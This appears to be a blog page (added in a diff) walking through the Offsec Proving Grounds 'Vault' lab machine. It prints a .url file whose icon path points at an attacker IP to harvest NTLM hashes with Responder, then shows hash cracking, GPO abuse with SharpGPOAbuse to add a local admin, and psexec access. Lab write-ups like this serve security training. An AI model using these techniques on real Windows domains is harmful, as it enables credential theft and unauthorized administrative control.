@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Practice: Vault</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Practice: Vault | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Practice: Vault" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice windows machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice windows machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/08/12/Proving_grounds_Practice-vault.html" />
+<meta property="og:url" content="http://localhost:4000/2023/08/12/Proving_grounds_Practice-vault.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-12T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Practice: Vault" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-08-12T12:00:00+05:30","datePublished":"2023-08-12T12:00:00+05:30","description":"Offsec proving grounds practice windows machine writeup","headline":"Proving grounds Practice: Vault","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/08/12/Proving_grounds_Practice-vault.html"},"url":"http://localhost:4000/2023/08/12/Proving_grounds_Practice-vault.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/08/12/Proving_grounds_Practice-vault.html">
+    <h2 class="post-title">Proving grounds Practice: Vault</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Aug 12, 2023</div></div>
+  <div class="post">
+    <h2 id="walkthrough-on-youtube">Walkthrough on Youtube</h2>
+<p><a href="https://youtu.be/JocbrhLXuss"><img src="/assets/images/CTF/Proving_Grounds/Vault/youtube.png" alt="youtube" /></a></p>
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-08-13 04:53:47Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49704/tcp open  msrpc         Microsoft Windows RPC
+</code></pre></div></div>
+
+<p>Domain name: <code class="language-plaintext highlighter-rouge">vault.offsec</code></p>
+
+<h2 id="smb-share">SMB share</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	DocumentsShare  Disk      
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+</code></pre></div></div>
+
+<h2 id="writing-files-to-documentsshare">Writing files to DocumentsShare</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/smb-doc-share.png" alt="smb doc share" /></p>
+
+<h2 id="obtain-ntlm-hash-via-uploading-url-file">Obtain NTLM Hash via uploading URL file</h2>
+
+<p>Run <code class="language-plaintext highlighter-rouge">responder</code> as root to listed for events to capture the NTLM Hash.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.45.170\%USERNAME%.icon
+IconIndex=1
+</code></pre></div></div>
+
+<p>IP address should be <code class="language-plaintext highlighter-rouge">responder IP</code>.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/NTLM.png" alt="Obtain NTLM" /></p>
+
+<p><strong>Crack the hash using john</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/john-pass-crack.png" alt="crack the hash" /></p>
+
+<p><strong>Connect to attacking machine using extracted credentials</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/evil-rm-connect.png" alt="Machine connect" /></p>
+
+<h2 id="enumerate-system-user-privileges">Enumerate system user privileges</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/windows_priv.png" alt="User Privilege" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Create a tmp directory in root directory and move <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview.ps1</a> to the attacking machine.</p>
+
+<h2 id="enumerate-group-policies">Enumerate Group Policies</h2>
+
+<p><strong>Default Domain Policy</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-GPO</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Default Domain Policy"</span><span class="w">
+
+</span><span class="n">DisplayName</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Policy</span><span class="w">
+</span><span class="n">DomainName</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">vault.offsec</span><span class="w">
+</span><span class="n">Owner</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">VAULT\Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
+</span><span class="n">Id</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">31b2f340-016d-11d2-945f-00c04fb984f9</span><span class="w">
+</span><span class="n">GpoStatus</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">AllSettingsEnabled</span><span class="w">
+</span><span class="n">Description</span><span class="w">      </span><span class="p">:</span><span class="w">
+</span><span class="n">CreationTime</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">11/19/2021</span><span class="w"> </span><span class="nx">12:50:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="n">ModificationTime</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">11/19/2021</span><span class="w"> </span><span class="nx">2:00:32</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="n">UserVersion</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nx">SysVol</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="n">ComputerVersion</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> </span><span class="nx">4</span><span class="p">,</span><span class="w"> </span><span class="nx">SysVol</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> </span><span class="nx">4</span><span class="w">
+</span><span class="n">WmiFilter</span><span class="w">        </span><span class="p">:</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Get GPPermission for anirudh</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-GPPermission</span><span class="w"> </span><span class="nt">-Guid</span><span class="w"> </span><span class="nx">31b2f340-016d-11d2-945f-00c04fb984f9</span><span class="w"> </span><span class="nt">-TargetType</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nt">-TargetName</span><span class="w"> </span><span class="nx">anirudh</span><span class="w">
+
+</span><span class="n">Trustee</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">anirudh</span><span class="w">
+</span><span class="n">TrusteeType</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">User</span><span class="w">
+</span><span class="n">Permission</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">GpoEditDeleteModifySecurity</span><span class="w">
+</span><span class="n">Inherited</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Permission  : GpoEditDeleteModifySecurity</code></p>
+
+<h2 id="abuse-group-policy">Abuse Group Policy</h2>
+
+<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse GitHub</a></p>
+
+<p>Compile and download the binary to the attacking machine.</p>
+
+<p>Download precompiled binary from <a href="https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master">here</a>.</p>
+
+<p><strong>Abuse vulnerable GPO to create new local admin to the attacking machine</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddLocalAdmin</span><span class="w"> </span><span class="nt">--UserAccount</span><span class="w"> </span><span class="nx">anirudh</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"Default Domain Policy"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/gpo-abuse1.png" alt="GitHub" /></p>
+
+<p>Force update group policy <code class="language-plaintext highlighter-rouge">gpupdate /force</code></p>
+
+<p><strong>Check local group administrators list</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w">
+</span><span class="n">Alias</span><span class="w"> </span><span class="nx">name</span><span class="w">     </span><span class="nx">administrators</span><span class="w">
+</span><span class="n">Comment</span><span class="w">        </span><span class="nx">Administrators</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">complete</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">unrestricted</span><span class="w"> </span><span class="nx">access</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">computer/domain</span><span class="w">
+
+</span><span class="n">Members</span><span class="w">
+</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
+</span><span class="n">Administrator</span><span class="w">
+</span><span class="nx">anirudh</span><span class="w">
+</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Use Psexec to get interactive administrator shell.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage:-
+python3 psexec.py domain_name/username:password@IP
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Vault/psexec1.png" alt="GitHub" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">proof.txt</code> obtained.</p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
